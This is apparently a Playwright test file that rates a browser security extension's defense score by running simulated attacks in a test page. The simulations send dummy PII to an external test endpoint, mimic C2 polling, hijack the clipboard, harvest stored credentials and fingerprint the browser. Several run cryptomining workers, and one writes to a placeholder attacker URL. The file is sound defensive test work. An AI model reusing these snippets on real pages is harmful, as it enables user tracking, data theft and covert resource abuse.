/**
 * Defense Score E2E Test
 *
 * Measures the Audit extension's defense score by running Battacker attack
 * simulations in MAIN world via page.evaluate(). This is necessary because
 * the Battacker extension's content script runs in ISOLATED world and cannot
 * be intercepted by our MAIN world hooks (api-hooks.js).
 *
 * Each attack is serialized as inline code and executed in the page context
 * where the Audit extension's hooks are active.
 */

import { test, expect } from "@playwright/test";
import { chromium, type BrowserContext, type Page } from "playwright";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { existsSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { readFileSync } from "node:fs";

const __dirname = dirname(fileURLToPath(import.meta.url));

const AUDIT_EXTENSION_PATH = resolve(__dirname, "../../audit-extension/dist/chrome-mv3");
const TEST_PAGE_PATH = resolve(__dirname, "../fixtures/test-page.html");
const DEFENSE_REPORT_PATH = resolve(__dirname, "../defense-score-report.json");

// ============================================================================
// Types (mirroring @pleno-audit/battacker)
// ============================================================================

type AttackCategory =
  | "network"
  | "phishing"
  | "client-side"
  | "download"
  | "persistence"
  | "side-channel"
  | "fingerprinting"
  | "cryptojacking"
  | "privacy"
  | "media"
  | "storage"
  | "worker"
  | "injection"
  | "covert"
  | "advanced";

type Severity = "critical" | "high" | "medium" | "low";
type Grade = "A" | "B" | "C" | "D" | "F";

interface AttackResult {
  blocked: boolean;
  executionTime: number;
  details: string;
  partial?: boolean;
  error?: string;
}

interface AttackDef {
  id: string;
  name: string;
  category: AttackCategory;
  description: string;
  severity: Severity;
  /** Inline function body to be serialized into page.evaluate() */
  simulate: (page: Page) => Promise<AttackResult>;
}

interface CategoryScore {
  category: AttackCategory;
  score: number;
  maxScore: number;
  blocked: number;
  total: number;
}

// ============================================================================
// Scoring constants (from @pleno-audit/battacker/types)
// ============================================================================

const SEVERITY_SCORES: Record<Severity, number> = {
  critical: 30,
  high: 20,
  medium: 10,
  low: 5,
};

const CATEGORY_WEIGHTS: Record<AttackCategory, number> = {
  network: 0.09,
  phishing: 0.05,
  "client-side": 0.09,
  download: 0.05,
  persistence: 0.05,
  "side-channel": 0.12,
  fingerprinting: 0.08,
  cryptojacking: 0.05,
  privacy: 0.06,
  media: 0.07,
  storage: 0.04,
  worker: 0.07,
  injection: 0.06,
  covert: 0.08,
  advanced: 0.04,
};

const CATEGORY_LABELS: Record<AttackCategory, string> = {
  network: "Network Attacks",
  phishing: "Phishing Attacks",
  "client-side": "Client-Side Attacks",
  download: "Download Attacks",
  persistence: "Persistence Attacks",
  "side-channel": "Side-Channel Attacks",
  fingerprinting: "Fingerprinting Attacks",
  cryptojacking: "Cryptojacking Attacks",
  privacy: "Privacy Attacks",
  media: "Media Capture Attacks",
  storage: "Storage Attacks",
  worker: "Worker Attacks",
  injection: "Injection Attacks",
  covert: "Covert Channel Attacks",
  advanced: "Advanced Exploitation",
};

function scoreToGrade(score: number): Grade {
  if (score >= 90) return "A";
  if (score >= 75) return "B";
  if (score >= 60) return "C";
  if (score >= 40) return "D";
  return "F";
}

// ============================================================================
// Attack Definitions (inline simulators for page.evaluate)
// ============================================================================

const attacks: AttackDef[] = [
  // --- Network ---
  {
    id: "network-beacon",
    name: "Tracking Beacon",
    category: "network",
    description: "Sends a tracking beacon to an external server with user info",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/post", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ type: "tracking_beacon", timestamp: Date.now(), userAgent: navigator.userAgent }),
          });
          return { blocked: false, executionTime: performance.now() - startTime, details: `Beacon sent (status: ${response.status})` };
        } catch (error: any) {
          const msg = error?.message ?? String(error);
          return { blocked: msg.includes("blocked") || msg.includes("ERR_BLOCKED"), executionTime: performance.now() - startTime, details: `Request failed: ${msg}` };
        }
      }),
  },
  {
    id: "network-exfiltration",
    name: "Data Exfiltration",
    category: "network",
    description: "Attempts to send sensitive data (PII) to an external server",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/post", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: "test@example.com", creditCard: "4111-1111-1111-1111", ssn: "123-45-6789", password: "password123" }),
          });
          return { blocked: false, executionTime: performance.now() - startTime, details: `Exfiltration simulated (status: ${response.status})` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "network-c2",
    name: "C2 Communication",
    category: "network",
    description: "Simulates command-and-control server polling",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://jsonplaceholder.typicode.com/posts/1");
          const data = await response.json();
          return { blocked: false, executionTime: performance.now() - startTime, details: `C2 polling successful, received ${JSON.stringify(data).length} bytes` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `C2 blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "network-websocket-c2",
    name: "WebSocket C2 Communication",
    category: "network",
    description: "Establishes WebSocket connection for C2 communication",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          try {
            const ws = new WebSocket("wss://echo.websocket.org/");
            let resolved = false;
            const timeout = setTimeout(() => {
              if (!resolved) { resolved = true; ws.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebSocket connection timed out" }); }
            }, 5000);
            ws.onopen = () => { ws.send(JSON.stringify({ type: "c2_checkin", timestamp: Date.now() })); };
            ws.onmessage = (event) => { if (!resolved) { resolved = true; clearTimeout(timeout); ws.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `WebSocket C2 successful: ${event.data.length} bytes` }); } };
            ws.onerror = () => { if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "WebSocket connection blocked" }); } };
          } catch (error: any) {
            resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebSocket blocked: ${error?.message}` });
          }
        });
      }),
  },
  {
    id: "network-webworker-exfil",
    name: "Web Worker Exfiltration",
    category: "network",
    description: "Uses Web Worker to exfiltrate data (bypasses main thread monitoring)",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const workerCode = `self.onmessage = async (e) => { try { const r = await fetch('https://httpbin.org/post', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({exfil: e.data}) }); self.postMessage({success:true, status:r.status}); } catch(err) { self.postMessage({success:false, error:err.message}); } };`;
          const blob = new Blob([workerCode], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker exfiltration timed out" }); }, 5000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: !e.data.success, executionTime: performance.now() - startTime, details: e.data.success ? `Worker exfil successful (status: ${e.data.status})` : `Worker fetch blocked: ${e.data.error}` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker creation blocked: ${err.message}` }); };
            worker.postMessage({ sensitiveData: "stolen-credentials", timestamp: Date.now() });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker exfil blocked: ${error?.message}` };
        }
      }),
  },

  // --- Phishing ---
  {
    id: "phishing-clipboard",
    name: "Clipboard Hijacking",
    category: "phishing",
    description: "Attempts to replace clipboard content with malicious data",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          await navigator.clipboard.writeText("malicious-crypto-address-1234567890");
          return { blocked: false, executionTime: performance.now() - startTime, details: "Clipboard hijack successful" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Clipboard hijack blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "phishing-credential-api",
    name: "Credential API Harvest",
    category: "phishing",
    description: "Attempts to silently harvest stored credentials",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("credentials" in navigator)) return { blocked: false, executionTime: performance.now() - startTime, details: "Credential Management API not available" };
          const credential = await navigator.credentials.get({ password: true, mediation: "silent" } as CredentialRequestOptions);
          return { blocked: false, executionTime: performance.now() - startTime, details: credential ? `Credential harvest: ${credential.type}` : "No stored credentials found" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Credential harvest blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "phishing-notification",
    name: "Notification Phishing",
    category: "phishing",
    description: "Displays fake security notification to lure user",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("Notification" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "Notification API not available" };
          const permission = await Notification.requestPermission();
          if (permission === "denied") return { blocked: true, executionTime: performance.now() - startTime, details: "Notification permission denied" };
          return { blocked: false, executionTime: performance.now() - startTime, details: `Notification permission: ${permission}` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Notification blocked: ${error?.message}` };
        }
      }),
  },

  // --- Client-Side ---
  {
    id: "client-xss",
    name: "XSS Payload Injection",
    category: "client-side",
    description: "Attempts to inject and execute script in the current page",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const el = document.createElement("div");
          el.id = "battacker-xss-test";
          el.style.display = "none";
          document.body.appendChild(el);
          const injected = document.getElementById("battacker-xss-test");
          document.body.removeChild(el);
          return { blocked: !injected, executionTime: performance.now() - startTime, details: injected ? "XSS-like injection successful" : "XSS injection blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Script injection blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "client-dom",
    name: "DOM Manipulation",
    category: "client-side",
    description: "Attempts to access and manipulate page DOM elements",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const forms = document.querySelectorAll("form");
          const inputs = document.querySelectorAll("input");
          return { blocked: false, executionTime: performance.now() - startTime, details: `DOM access: ${forms.length} forms, ${inputs.length} inputs` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `DOM blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "client-cookie",
    name: "Cookie Theft",
    category: "client-side",
    description: "Attempts to read cookies from the current page",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const cookies = document.cookie;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Cookie access: ${cookies.length} chars` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Cookie access blocked: ${error?.message}` };
        }
      }),
  },

  // --- Download ---
  {
    id: "download-blob",
    name: "Blob URL Download",
    category: "download",
    description: "Attempts to download a dynamically generated malicious file via Blob URL",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const blob = new Blob(["malicious"], { type: "application/octet-stream" });
          const url = URL.createObjectURL(blob);
          const link = document.createElement("a");
          link.href = url;
          link.download = "test-payload.sh";
          URL.revokeObjectURL(url);
          return { blocked: false, executionTime: performance.now() - startTime, details: "Blob URL download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Blob download blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "download-dataurl",
    name: "Data URL Download",
    category: "download",
    description: "Attempts to download a Base64-encoded payload via Data URL",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const link = document.createElement("a");
          link.href = `data:application/octet-stream;base64,${btoa("malicious payload")}`;
          link.download = "test-data-payload.txt";
          return { blocked: false, executionTime: performance.now() - startTime, details: "Data URL download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Data URL download blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "download-suspicious",
    name: "Suspicious File Download",
    category: "download",
    description: "Attempts to trigger download of a suspicious executable file",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const link = document.createElement("a");
          link.href = "data:text/plain;base64,dGVzdA==";
          link.download = "suspicious-file.exe";
          return { blocked: false, executionTime: performance.now() - startTime, details: "Suspicious file download link created" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Suspicious download blocked: ${error?.message}` };
        }
      }),
  },

  // --- Persistence ---
  {
    id: "persistence-indexeddb",
    name: "IndexedDB Data Stash",
    category: "persistence",
    description: "Stores sensitive data in IndexedDB for later exfiltration",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          try {
            const req = indexedDB.open("battacker_stash_test", 1);
            req.onerror = () => resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB access blocked" });
            req.onupgradeneeded = (e: any) => { const db = e.target.result; if (!db.objectStoreNames.contains("data")) db.createObjectStore("data", { keyPath: "id" }); };
            req.onsuccess = (e: any) => {
              const db = e.target.result;
              try {
                const tx = db.transaction(["data"], "readwrite");
                const store = tx.objectStore("data");
                store.add({ id: Date.now(), email: "victim@example.com", password: "hashed" });
                tx.oncomplete = () => { db.close(); indexedDB.deleteDatabase("battacker_stash_test"); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "IndexedDB data stash successful" }); };
                tx.onerror = () => { db.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB write blocked" }); };
              } catch { db.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "IndexedDB operation blocked" }); }
            };
          } catch (error: any) {
            resolve({ blocked: true, executionTime: performance.now() - startTime, details: `IndexedDB blocked: ${error?.message}` });
          }
        });
      }),
  },
  {
    id: "persistence-cache-api",
    name: "Cache API Abuse",
    category: "persistence",
    description: "Abuses Cache Storage API to persist exfiltration data",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("caches" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "Cache API not available" };
          const cache = await caches.open("battacker-exfil-cache");
          await cache.put("https://attacker.local/exfil.json", new Response(JSON.stringify({ data: "stolen" })));
          const cached = await cache.match("https://attacker.local/exfil.json");
          await caches.delete("battacker-exfil-cache");
          return { blocked: !cached, executionTime: performance.now() - startTime, details: cached ? "Cache API abuse successful" : "Cache API retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Cache API blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "persistence-history",
    name: "History State Exfil",
    category: "persistence",
    description: "Hides sensitive data in browser history state",
    severity: "low",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const orig = history.state;
          history.replaceState({ type: "history_exfil", credentials: "username:password" }, "", location.href);
          const retrieved = history.state;
          history.replaceState(orig, "", location.href);
          return { blocked: !(retrieved?.type === "history_exfil"), executionTime: performance.now() - startTime, details: retrieved?.type === "history_exfil" ? "History state exfil successful" : "History state blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `History state blocked: ${error?.message}` };
        }
      }),
  },

  // --- Side-Channel ---
  {
    id: "side-channel-canvas",
    name: "Canvas Fingerprinting",
    category: "side-channel",
    description: "Generates browser fingerprint via Canvas API rendering differences",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const canvas = document.createElement("canvas");
          canvas.width = 200; canvas.height = 50;
          const ctx = canvas.getContext("2d");
          if (!ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas 2D context not available" };
          ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
          ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069"; ctx.fillText("BrowserFingerprint", 2, 15);
          const dataUrl = canvas.toDataURL();
          if (dataUrl && dataUrl.length > 100) return { blocked: false, executionTime: performance.now() - startTime, details: `Canvas fingerprint: ${dataUrl.slice(-50)}` };
          return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas fingerprinting returned empty data" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Canvas blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-timing",
    name: "Performance Timing Attack",
    category: "side-channel",
    description: "Extracts sensitive timing information via Performance API",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const data: Record<string, any> = {};
          const entries = performance.getEntriesByType("navigation");
          if (entries.length > 0) { const nav = entries[0] as PerformanceNavigationTiming; data.duration = nav.duration; data.transferSize = nav.transferSize; }
          const res = performance.getEntriesByType("resource").slice(0, 5);
          data.resourceCount = res.length;
          const perf = performance as any;
          if (perf.memory) { data.usedHeap = perf.memory.usedJSHeapSize; }
          const fields = Object.keys(data).length;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Performance timing: ${fields} metrics collected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Performance timing blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-broadcast",
    name: "BroadcastChannel Leak",
    category: "side-channel",
    description: "Leaks data between browser tabs via BroadcastChannel API",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          if (!("BroadcastChannel" in window)) return { blocked: false, executionTime: performance.now() - startTime, details: "BroadcastChannel not available" };
          const sender = new BroadcastChannel("battacker_exfil");
          const receiver = new BroadcastChannel("battacker_exfil");
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { sender.close(); receiver.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "BroadcastChannel timed out or blocked" }); }, 2000);
            receiver.onmessage = (event) => { clearTimeout(timeout); sender.close(); receiver.close(); resolve({ blocked: !(event.data?.type === "exfil"), executionTime: performance.now() - startTime, details: event.data?.type === "exfil" ? "BroadcastChannel leak successful" : "BroadcastChannel data corrupted" }); };
            sender.postMessage({ type: "exfil", payload: { credentials: "stolen", sessionId: "abc123" } });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `BroadcastChannel blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-spectre-mitigation",
    name: "Spectre Timing Mitigation Check",
    category: "side-channel",
    description: "Verifies browser Spectre mitigations (timer precision reduction)",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const measurements: number[] = [];
        for (let i = 0; i < 100; i++) { const t1 = performance.now(); const t2 = performance.now(); measurements.push(t2 - t1); }
        const nonZero = measurements.filter((m) => m > 0);
        const minRes = nonZero.length > 0 ? Math.min(...nonZero) : 0;
        if (minRes >= 0.1) return { blocked: true, executionTime: performance.now() - startTime, details: `Spectre mitigation active - resolution ${minRes.toFixed(3)}ms` };
        if (minRes >= 0.005) return { blocked: false, executionTime: performance.now() - startTime, details: `Spectre partially mitigated - resolution ${minRes.toFixed(3)}ms` };
        return { blocked: false, executionTime: performance.now() - startTime, details: `High-precision timer available - resolution ${minRes.toFixed(6)}ms` };
      }),
  },
  {
    id: "side-channel-sharedarraybuffer",
    name: "SharedArrayBuffer Isolation Check",
    category: "side-channel",
    description: "Checks Cross-Origin Isolation status for SharedArrayBuffer",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (typeof SharedArrayBuffer === "undefined") return { blocked: true, executionTime: performance.now() - startTime, details: "SharedArrayBuffer disabled - Cross-Origin Isolation not enabled" };
        const crossOriginIsolated = (self as any).crossOriginIsolated ?? false;
        if (crossOriginIsolated) return { blocked: true, executionTime: performance.now() - startTime, details: "SharedArrayBuffer with Cross-Origin Isolation (COOP/COEP)" };
        return { blocked: false, executionTime: performance.now() - startTime, details: "SharedArrayBuffer available without Cross-Origin Isolation" };
      }),
  },

  // --- Fingerprinting ---
  {
    id: "fingerprint-webgl",
    name: "WebGL Fingerprinting",
    category: "fingerprinting",
    description: "Extracts GPU and WebGL renderer information for device identification",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (!gl) return { blocked: true, executionTime: performance.now() - startTime, details: "WebGL context not available" };
          const webgl = gl as WebGLRenderingContext;
          const fp: Record<string, string | null> = {};
          fp.vendor = webgl.getParameter(webgl.VENDOR);
          fp.renderer = webgl.getParameter(webgl.RENDERER);
          fp.version = webgl.getParameter(webgl.VERSION);
          fp.shadingLang = webgl.getParameter(webgl.SHADING_LANGUAGE_VERSION);
          const dbg = webgl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) { fp.unmaskedVendor = webgl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); fp.unmaskedRenderer = webgl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }
          const fields = Object.values(fp).filter(Boolean).length;
          return { blocked: fields < 4, executionTime: performance.now() - startTime, details: fields >= 4 ? `WebGL fingerprint: ${fields} params (GPU: ${fp.unmaskedRenderer || fp.renderer})` : `WebGL partially blocked: ${fields} params` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WebGL blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-audio",
    name: "Audio Fingerprinting",
    category: "fingerprinting",
    description: "Generates unique audio processing signature via AudioContext API",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const Ctx = window.AudioContext || (window as any).webkitAudioContext;
          if (!Ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "AudioContext not available" };
          const ac = new Ctx();
          const osc = ac.createOscillator();
          const analyser = ac.createAnalyser();
          const gain = ac.createGain();
          const comp = ac.createDynamicsCompressor();
          comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
          osc.type = "triangle"; osc.frequency.value = 10000;
          gain.gain.value = 0;
          osc.connect(comp); comp.connect(analyser); analyser.connect(gain); gain.connect(ac.destination);
          osc.start(0);
          await new Promise((r) => setTimeout(r, 100));
          const data = new Float32Array(analyser.frequencyBinCount);
          analyser.getFloatFrequencyData(data);
          let hash = 0;
          for (let i = 0; i < data.length; i++) { if (Number.isFinite(data[i])) { hash = (hash << 5) - hash + Math.round(data[i] * 1000); hash = hash | 0; } }
          osc.stop(); ac.close();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Audio fingerprint hash: ${hash.toString(16)}` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Audio blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-font",
    name: "Font Fingerprinting",
    category: "fingerprinting",
    description: "Detects installed fonts via canvas text measurement",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const testFonts = ["Arial", "Helvetica", "Times New Roman", "Georgia", "Verdana", "Courier New", "Comic Sans MS", "Impact", "Trebuchet MS", "Tahoma"];
          const baseFonts = ["monospace", "sans-serif", "serif"];
          const testStr = "mmmmmmmmmmlli1WWWWWWWWWWwwwwwwwwww0123456789";
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          if (!ctx) return { blocked: true, executionTime: performance.now() - startTime, details: "Canvas context not available" };
          const getWidth = (f: string) => { ctx.font = `72px ${f}`; return ctx.measureText(testStr).width; };
          const baseWidths = baseFonts.map(getWidth);
          const detected: string[] = [];
          for (const font of testFonts) { for (let i = 0; i < baseFonts.length; i++) { if (getWidth(`'${font}', ${baseFonts[i]}`) !== baseWidths[i]) { detected.push(font); break; } } }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Font fingerprint: ${detected.length}/${testFonts.length} fonts detected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Font fingerprint blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-screen",
    name: "Screen Fingerprinting",
    category: "fingerprinting",
    description: "Collects screen resolution, DPI, and display properties",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const fp = { screenWidth: screen.width, screenHeight: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio, innerWidth: window.innerWidth, innerHeight: window.innerHeight };
          return { blocked: false, executionTime: performance.now() - startTime, details: `Screen fingerprint: ${fp.screenWidth}x${fp.screenHeight} @ ${fp.pixelRatio}x` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Screen fingerprint blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprint-navigator",
    name: "Navigator Fingerprinting",
    category: "fingerprinting",
    description: "Extracts browser and device information from navigator object",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const fp: Record<string, any> = { userAgent: navigator.userAgent, language: navigator.language, platform: navigator.platform, cookieEnabled: navigator.cookieEnabled, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints };
          const fields = Object.values(fp).filter((v) => v !== undefined).length;
          return { blocked: false, executionTime: performance.now() - startTime, details: `Navigator fingerprint: ${fields} properties collected` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Navigator fingerprint blocked: ${error?.message}` };
        }
      }),
  },

  // --- Cryptojacking ---
  {
    id: "cryptojacking-cpu",
    name: "CPU Mining Simulation",
    category: "cryptojacking",
    description: "Simulates cryptocurrency mining using main thread CPU resources",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        let hashCount = 0;
        const duration = 200;
        const simpleHash = (d: string) => { let h = 0; for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h = h | 0; } return Math.abs(h).toString(16).padStart(8, "0"); };
        const mineStart = performance.now();
        let nonce = 0;
        while (performance.now() - mineStart < duration) { simpleHash(`block:${Date.now()}:nonce:${nonce}`); hashCount++; nonce++; }
        const hashRate = Math.round((hashCount / duration) * 1000);
        return { blocked: false, executionTime: performance.now() - startTime, details: `CPU mining: ${hashRate} h/s (${hashCount} hashes)` };
      }),
  },
  {
    id: "cryptojacking-worker",
    name: "Web Worker Mining",
    category: "cryptojacking",
    description: "Uses Web Worker for background mining",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const code = `let running=true;function h(d){let hash=0;for(let i=0;i<d.length;i++){hash=((hash<<5)-hash)+d.charCodeAt(i);hash=hash|0;}return Math.abs(hash).toString(16);}self.onmessage=function(e){let c=0;const s=Date.now();while(Date.now()-s<e.data.duration&&running){h('block:'+Date.now()+':'+c);c++;}self.postMessage({hashCount:c,hashRate:Math.round(c/e.data.duration*1000)});};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker mining timed out" }); }, 3000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Worker mining: ${e.data.hashRate} h/s` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker mining blocked: ${err.message}` }); };
            worker.postMessage({ duration: 200 });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker mining blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "cryptojacking-multi-worker",
    name: "Multi-Worker Mining Pool",
    category: "cryptojacking",
    description: "Spawns multiple Web Workers to maximize mining throughput",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const workerCount = Math.min(navigator.hardwareConcurrency || 4, 4);
          const code = `function h(d){let hash=0;for(let i=0;i<d.length;i++){hash=((hash<<5)-hash)+d.charCodeAt(i);hash=hash|0;}return Math.abs(hash).toString(16);}self.onmessage=function(e){let c=0;const s=Date.now();while(Date.now()-s<e.data.duration){h('block:'+Date.now()+':'+e.data.id+':'+c);c++;}self.postMessage({hashCount:c,hashRate:Math.round(c/e.data.duration*1000)});};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const workers: Worker[] = [];
          for (let i = 0; i < workerCount; i++) workers.push(new Worker(url));
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const results: any[] = [];
            const timeout = setTimeout(() => { workers.forEach((w) => w.terminate()); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Multi-worker mining timed out (spawned ${workerCount})` }); }, 3000);
            workers.forEach((w, i) => {
